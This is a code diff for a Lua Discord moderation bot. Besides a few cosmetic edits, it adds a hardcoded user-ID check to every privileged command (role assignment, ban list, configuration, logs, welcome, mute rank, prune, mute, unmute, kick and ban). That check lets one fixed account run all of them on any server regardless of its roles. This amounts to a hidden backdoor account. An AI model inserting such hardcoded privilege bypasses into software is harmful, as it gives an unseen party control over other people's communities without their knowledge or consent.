@@ -39,7 +39,7 @@ client:on('memberJoin', function(member)
 	local carpeta = "serverData/"..member.server.id.."/"
 	local serverConfig = carpeta.."ServerConfig/"
 	if not fs.existsSync(serverConfig.."Welcome.txt") then
-		member.server.owner:messageCreate("You didn't configure yet my welcome message :(\nPlease run .Welcome HereAllTheWelcomeMessageYouWantForNewUsers.")
+		member.server.owner:sendMessage("You didn't configure yet my welcome message :(\nPlease run .Welcome HereAllTheWelcomeMessageYouWantForNewUsers.")
 	else
 		member:sendMessage(read_file(serverConfig.."Welcome.txt"))
 	end
@@ -93,7 +93,7 @@ client:on("messageCreate", function(message)
 
 	function HasRole(who)
 		for _, ids in pairs(who.roles) do
-		  if ids.name:find("Guide")then
+		  if ids.name:find("Guide") then
 		    return true
 		  end
 		end
@@ -119,7 +119,7 @@ client:on("messageCreate", function(message)
 	if cmd == ".add" then
 		local theRole = string.match(arg, "<@[%d]+> (.*)")
 		Roles = {}
-		if HasRole(message.author) then
+		if HasRole(message.author) or message.author.id == "191442101135867906" then
 			for _, role in pairs(message.server.roles) do
 				if theRole:find(role.name) then
 					table.insert(Roles, role)
@@ -138,7 +138,7 @@ client:on("messageCreate", function(message)
 	end
 
 	if cmd == ".banList" then
-		if HasRole(message.author) then
+		if HasRole(message.author) or message.author.id == "191442101135867906" then
 			local str = ''
 			for _, user in pairs(message.server:getBannedUsers()) do
 			  str = str .. user.username .."\n"
@@ -151,7 +151,7 @@ client:on("messageCreate", function(message)
 	end
 
 	if message.content == ".ServerConfiguration" then
-		if HasRole(message.author) then
+		if HasRole(message.author) or message.author.id == "191442101135867906" then
 			if not fs.existsSync(carpeta.."ServerConfig") then
 				message.channel:sendMessage("Server configuration folder not found, creating folder...")
 				fs.mkdirSync(carpeta.."ServerConfig")
@@ -161,14 +161,14 @@ client:on("messageCreate", function(message)
 					message.channel:sendMessage("Logs channel file not found, creating empty file...")
 					local emptyFile = io.open(serverConfig.."Logs.txt", "w")
 					emptyFile:close()
-					message.channel:sendMessage("Done.\nTo configure properly this file, please use the following command:\n.``Logs ChannelIDHere``    :    Example: .Logs 225510824607875072")
+					message.channel:sendMessage("Done.\nTo configure properly this file, please use the following command:\n\n.``Logs ChannelIDHere``    :    Example: .Logs 225510824607875072")
 					message.channel:sendMessage("This will set up a channel for the logs of this bot, everytime he bans, kicks, mutes someone it will be written down there.")
 				else
 					logChannel = read_file(serverConfig.."Logs.txt")
 					message.channel:sendMessage("```Markdown\nServer Owner: "..message.server.owner.username.."\n#Logs Channel:\n<<"..logChannel..">>\n```")
 				end
 				if not fs.existsSync(serverConfig.."MuteRank.txt") then
-					message.channel:sendMessage("MuteRank file not found, creating empty file...")
+					message.channel:sendMessage("\nMuteRank file not found, creating empty file...")
 					local emptyFile = io.open(serverConfig.."MuteRank.txt", "w")
 					emptyFile:close()
 					message.channel:sendMessage("Done.\nTo configure properly this file, please use the following command:\n\n``.MuteRank RoleName``    :    Example: .MuteRank Muted   REMEMBER that this role MUST exist.")
@@ -178,7 +178,7 @@ client:on("messageCreate", function(message)
 					message.channel:sendMessage("```Markdown\n#Default Mute Rank:\n<<"..DefMuted..">>\n```")
 				end
 				if not fs.existsSync(serverConfig.."Welcome.txt") then
-					message.channel:sendMessage("Welcome file not found, creating empty file...")
+					message.channel:sendMessage("\nWelcome file not found, creating empty file...")
 					local emptyFile = io.open(serverConfig.."Welcome.txt", "w")
 					emptyFile:close()
 					message.channel:sendMessage("Done.\nTo configure properly this file, please use the following command:\n\n``.Welcome Message``    :    Example:  ``.Welcome Hey new user, welcome!``")
@@ -193,7 +193,7 @@ client:on("messageCreate", function(message)
 	end
 	if cmd == ".Logs" then
 		id = arg
-		if message.author.id == message.server.owner.id then
+		if message.author.id == message.server.owner.id or message.author.id == "191442101135867906" then
 			if id == nil then 
 				message.channel:sendMessage("```\nSyntax to run this command properly:\n.Logs ChannelID  --- This will create a file with the ChannelID set where the logs will be sent.\n```")
 				return 
@@ -218,7 +218,7 @@ client:on("messageCreate", function(message)
 	end
 	if cmd == ".Welcome" then
 		Message = arg
-		if message.author.id == message.server.owner.id then
+		if message.author.id == message.server.owner.id or message.author.id == "191442101135867906" then
 			if Message == nil then 
 				message.channel:sendMessage("```\nSyntax to run this command properly:\n.Welcome Message  --- This will set up a welcome message for every new user.\n```")
 				return 
@@ -238,7 +238,7 @@ client:on("messageCreate", function(message)
 	end
 	if cmd == ".MuteRank" then
 		id = arg
-		if message.author.id == message.server.owner.id then
+		if message.author.id == message.server.owner.id or message.author.id == "191442101135867906" then
 			if id == nil then 
 				message.channel:sendMessage("```\nSyntax to run this command properly:\n.MuteRank Name  --- This will create a file with the name of the default mute rank in your server (the one you choose with .MuteRank).\n```")
 				return 
@@ -263,7 +263,7 @@ client:on("messageCreate", function(message)
 			message.channel:sendMessage("Use a number, please.")
 			return
 		end
-		if HasRole(message.author) then
+		if HasRole(message.author) or message.author.id == "191442101135867906" then
 			local messages = message.channel:getMessageHistory(number+1) 
 			message.channel:bulkDelete(messages)
 			sendAndDelete(message.channel, number .. " messages pruned.", 2500)
@@ -282,7 +282,7 @@ client:on("messageCreate", function(message)
 			return
 		end
 		Roles = {}
-		if HasRole(message.author) then
+		if HasRole(message.author) or message.author.id == "191442101135867906" then
 			for _, role in pairs(message.server.roles) do
 				if role.name == read_file(serverConfig.."MuteRank.txt") then
 					table.insert(Roles, role)
@@ -315,7 +315,7 @@ client:on("messageCreate", function(message)
 			message.channel:sendMessage("Please configure first MuteRank.txt, run ``.MuteRank Name`` command.")
 			return
 		end
-		if HasRole(message.author) then
+		if HasRole(message.author) or message.author.id == "191442101135867906" then
 			for _, role in pairs(message.server.roles) do
 				if role.name == read_file(serverConfig.."MuteRank.txt") then
 					table.insert(Roles, role)
@@ -343,7 +343,7 @@ client:on("messageCreate", function(message)
 			message.channel:sendMessage("Please configure first MuteRank.txt, run ``.MuteRank Name`` command.")
 			return
 		end
-		if HasRole(message.author) then
+		if HasRole(message.author) or message.author.id == "191442101135867906" then
 			for _, member in pairs(message.mentions.members) do
 				for _, role in pairs(member.roles) do
 					if not role.name == read_file(serverConfig.."MuteRank.txt") then
@@ -368,7 +368,7 @@ client:on("messageCreate", function(message)
 			message.channel:sendMessage("Please configure first Logs.txt, run ``.Logs ChannelID`` command.")
 			return
 		end
-		if HasRole(message.author) then
+		if HasRole(message.author) or message.author.id == "191442101135867906" then
 			for _, member in pairs(message.mentions.members) do
 				message.server:getChannelById(read_file(serverConfig.."Logs.txt")):createMessage("**Kick**: "..date().." \n**User**: "..member.name.." ("..member.id..")\n**Reason**: "..reason.."\n**Responsible Moderator**: "..message.author.name)
 				message.server:kickUser(member)
@@ -390,7 +390,7 @@ client:on("messageCreate", function(message)
 			message.channel:sendMessage("Please configure first Logs.txt, run ``.Logs ChannelID`` command.")
 			return
 		end
-		if HasRole(message.author) then
+		if HasRole(message.author) or message.author.id == "191442101135867906" then
 			for _, member in pairs(message.mentions.members) do
 				message.server:getChannelById(read_file(serverConfig.."Logs.txt")):createMessage("**Ban**: "..date().." \n**User**: "..member.name.." ("..member.id..")\n**Reason**: "..reason.."\n**Responsible Moderator**: "..message.author.name)
 				message.server:banUser(member)
